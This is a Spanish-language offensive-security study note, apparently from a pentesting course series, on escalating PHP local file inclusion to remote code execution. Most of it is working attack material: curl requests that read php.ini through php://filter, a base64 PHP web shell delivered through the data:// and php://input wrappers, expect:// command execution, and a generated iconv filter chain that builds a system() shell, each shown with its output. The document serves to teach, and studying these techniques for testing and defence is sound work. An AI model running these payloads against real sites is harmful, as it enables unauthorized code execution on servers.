---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - File-Inclusion
Fecha de actualización: 2026-06-21
Nota previa: "[[03 - PHP wrappers I - php filter y disclosure de código]]"
Nota siguiente: "[[05 - Remote File Inclusion (RFI)]]"
Area: "[[File Inclusion.base|File Inclusion]]"
---
---

Leer código es útil, pero el objetivo final es **ejecutar comandos**. Esta nota cubre las vías de RCE a través de la propia función vulnerable, sin depender de credenciales filtradas. Tres dependen de la config `allow_url_include`; la cuarta —la moderna— no necesita nada y es la que <mark style="background: #FFB86CA6;">convierte una LFI de solo lectura en RCE</mark>.

# Comprobar `allow_url_include`

Los wrappers `data://` e `input://` requieren `allow_url_include = On` (desactivado por defecto). Se comprueba leyendo el `php.ini` con el [[03 - PHP wrappers I - php filter y disclosure de código|filtro base64]]:

```shell-session
$ curl "http://target/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" | base64 -d | grep allow_url_include
allow_url_include = On
```

> [!warning]+ La ruta del `php.ini` varía
> Ajusta versión y SAPI: `/etc/php/8.x/apache2/php.ini`, `/etc/php/8.x/fpm/php.ini` (Nginx/PHP-FPM), `C:\xampp\php\php.ini`. Si no la conoces, fuzzéala con una wordlist LFI.

<mark style="background: #FFB8EBA6;">No viene activado por defecto, pero no es raro encontrarlo</mark>: muchos plugins y temas de WordPress lo necesitan.

# `data://` — incluir código como dato

El wrapper `data://` incluye datos arbitrarios, incluido código PHP, que `include()` ejecuta. Se le pasa el web shell en Base64:

```shell-session
$ echo '<?php system($_GET["cmd"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

```shell-session
$ curl "http://target/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# `input://` — código en el cuerpo POST

`php://input` lee el cuerpo de la petición como código a ejecutar. Igual que `data://`, depende de `allow_url_include`; la petición debe enviarse por **POST** para que tenga cuerpo, aunque el parámetro vulnerable siga en la query string `GET`:

```shell-session
$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://target/index.php?language=php://input&cmd=id" | grep uid
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Si el sink solo acepta POST y no `$_REQUEST`, se mete el comando fijo en el código (`<?php system('id'); ?>`) en lugar de un web shell dinámico.

# `expect://` — ejecución directa

El wrapper `expect://` ejecuta comandos directamente, sin web shell. Pero es una extensión externa que debe estar instalada (`extension=expect` en `php.ini`):

```shell-session
$ curl -s "http://target/index.php?language=expect://id" | grep uid
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<mark style="background: #ADCCFFA6;">`expect` está diseñado para ejecutar comandos</mark>, así que es el más directo cuando está disponible. El mismo wrapper reaparece en [[Web Attacks|XXE]].

# PHP filter chains: RCE sin upload ni `allow_url_include`

Aquí está la técnica que cambió el juego y que el módulo original no recoge —de [Synacktiv (Rémi Matasse)](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it): la cadena de RCE se publicó en **2022**, y el [oráculo de lectura ciega](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle) en **2023** (sobre un reto de `@hash_kitten` en DownUnderCTF 2022)—. El problema clásico: tienes una LFI que **solo lee** (`file_get_contents`, o `include` con `allow_url_include` apagado y sin upload). Parecía un callejón sin salida para RCE.

La idea: <mark style="background: #8000E1A6;">los filtros de conversión `iconv` de `php://filter` se pueden **encadenar**, y cada conversión entre codificaciones añade bytes predecibles al principio del stream</mark>. Encadenando cientos de conversiones con el orden correcto, se **construye byte a byte un payload PHP arbitrario** al vuelo, que el `include()` acaba ejecutando. Todo dentro de un `php://filter` —que es solo "lectura"—.

<mark style="background: #FF5582A6;">El resultado: cualquier LFI que admita el wrapper `php://filter` se convierte en RCE</mark>, sin subir ficheros, sin `allow_url_include`, sin logs que envenenar. Construir la cadena a mano es inviable; se genera con la herramienta de referencia:

```shell-session
$ python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
[+] The following gadget chain will generate the following code: <?php system($_GET["cmd"]); ?>
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|resource=php://temp
```

La cadena generada (muy larga) se coloca en el parámetro vulnerable, y el comando se pasa con `&cmd=`:

```
?language=php://filter/convert.iconv.UTF8.CSISO2022KR|...|resource=php://temp&cmd=id
```

> [!success]+ Por qué es la primera opción hoy
> Frente a `data://`/`input://` (requieren `allow_url_include`) y al [[06 - LFI + File Upload a RCE|LFI+upload]] o el [[07 - Log Poisoning y envenenamiento de sesiones|log poisoning]] (requieren un fichero escribible o logs accesibles), <mark style="background: #FFB86CA6;">las filter chains no necesitan ninguna precondición salvo que el sink admita `php://filter`</mark>. En un objetivo PHP moderno y endurecido, suele ser la única vía a RCE. La misma primitiva sirve además como **oráculo de lectura ciega** (error-based): provoca errores distinguibles según el byte leído, útil cuando la LFI no devuelve contenido.

> [!info]+ Fuentes
> - [Synacktiv — PHP filter chains: file read from error-based oracle](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle) y [How to use them](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
> - [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) (RCE) · [php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit) (lectura ciega)
> - [HackTricks — LFI2RCE via PHP filters](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)

Cuando la función admite URLs remotas, hay una vía aún más directa: incluir un script que alojamos nosotros. La [[05 - Remote File Inclusion (RFI)]].
